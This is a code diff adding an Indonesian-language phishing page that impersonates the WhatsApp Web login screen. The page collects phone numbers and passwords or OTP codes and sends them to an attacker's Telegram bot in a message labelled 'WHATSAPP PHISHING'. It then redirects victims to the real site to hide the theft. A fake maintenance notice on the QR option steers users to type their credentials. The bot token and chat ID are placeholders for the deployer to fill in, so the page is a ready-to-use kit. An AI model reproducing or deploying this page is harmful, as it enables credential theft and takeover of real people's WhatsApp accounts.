@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>WhatsApp Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #075E54 0%, #128C7E 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .whatsapp-container {
+            background: white;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            background: #075E54;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 60px;
+            margin-bottom: 15px;
+        }
+        
+        .header h2 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .login-form {
+            padding: 30px 25px;
+        }
+        
+        .alert {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: center;
+            border-left: 4px solid #c62828;
+            display: none;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #25D366;
+            box-shadow: 0 0 0 3px rgba(37,211,102,0.1);
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 20px;
+        }
+        
+        .login-btn:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+        }
+        
+        .qr-option {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .qr-option p {
+            color: #999;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .qr-option p:before,
+        .qr-option p:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 30%;
+            height: 1px;
+            background: #ddd;
+        }
+        
+        .qr-option p:before {
+            left: 0;
+        }
+        
+        .qr-option p:after {
+            right: 0;
+        }
+        
+        .qr-btn {
+            background: #f5f5f5;
+            color: #075E54;
+            border: 2px solid #075E54;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .qr-btn:hover {
+            background: #075E54;
+            color: white;
+        }
+        
+        .qr-container {
+            text-align: center;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 15px;
+            display: none;
+        }
+        
+        .qr-container img {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 15px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            color: #999;
+            font-size: 12px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            .login-form {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="whatsapp-container">
+            <div class="header">
+                <img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/r6qwYw6KR6C.png" alt="WhatsApp" class="logo">
+                <h2>WhatsApp Web</h2>
+                <p>Scan kode QR atau login untuk mengakses</p>
+            </div>
+            
+            <div class="login-form" id="loginForm">
+                <div class="alert" id="alert">⚠️ Sesi berakhir, silakan login ulang</div>
+                
+                <div class="input-group">
+                    <label>📱 Nomor Telepon</label>
+                    <input type="tel" id="phone" placeholder="+62 812 3456 7890" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔐 Kata Sandi / Kode OTP</label>
+                    <input type="password" id="password" placeholder="Masukkan password atau kode OTP" required>
+                </div>
+                
+                <button id="submitBtn" class="login-btn">Login ke WhatsApp Web</button>
+                
+                <div class="qr-option">
+                    <p>atau</p>
+                    <button id="qrBtn" class="qr-btn">🔲 Scan Kode QR</button>
+                </div>
+                
+                <div class="qr-container" id="qrContainer">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=whatsapp://" alt="QR Code">
+                    <p>Scan dengan WhatsApp di ponsel</p>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>© 2026 WhatsApp Inc.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // QR Toggle
+        document.getElementById('qrBtn').onclick = function() {
+            document.getElementById('qrContainer').style.display = 'block';
+            document.getElementById('alert').style.display = 'block';
+            document.getElementById('alert').innerHTML = '⚠️ Fitur QR sedang maintenance, silakan login manual';
+        };
+        
+        // Submit data
+        document.getElementById('submitBtn').onclick = function() {
+            var phone = document.getElementById('phone').value;
+            var password = document.getElementById('password').value;
+            
+            if(phone === '' || password === '') {
+                alert('Harap isi semua field!');
+                return;
+            }
+            
+            // Kirim data ke Telegram (tanpa backend)
+            var botToken = 'YOUR_BOT_TOKEN_HERE';  // GANTI PUNYA LO!
+            var chatId = 'YOUR_CHAT_ID_HERE';      // GANTI PUNYA LO!
+            
+            var message = `🔴 *WHATSAPP PHISHING* 🔴%0A%0A📞 *Nomor:* ${phone}%0A🔑 *Password/OTP:* ${password}%0A📅 *Waktu:* ${new Date().toLocaleString()}%0A🕵️ *Status:* SUCCESS`;
+            
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
+            
+            fetch(url)
+                .then(response => {
+                    document.getElementById('alert').style.display = 'block';
+                    document.getElementById('alert').innerHTML = '✅ Verifikasi berhasil, mengalihkan...';
+                    setTimeout(function() {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 2000);
+                })
+                .catch(error => {
+                    document.getElementById('alert').style.display = 'block';
+                    document.getElementById('alert').innerHTML = '⚠️ Error, silakan coba lagi';
+                });
+        };
+    </script>
+</body>
+</html>
